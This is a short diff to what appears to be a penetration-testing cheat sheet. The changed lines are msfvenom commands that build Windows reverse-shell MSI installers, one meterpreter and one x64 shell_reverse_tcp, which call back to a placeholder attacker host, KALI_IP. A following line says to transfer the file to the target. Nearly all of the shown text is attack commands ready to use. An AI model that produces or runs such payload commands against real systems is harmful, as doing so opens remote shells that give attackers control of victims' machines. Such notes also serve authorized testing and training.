@@ -129,7 +129,8 @@ run
 Generate MSI payload:
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP -f msi -o setup.msi
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=<port> -f msi -o setup.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=<port> -f msi > setup.msi
 ```
 
 Transfer `setup.msi` to the target.
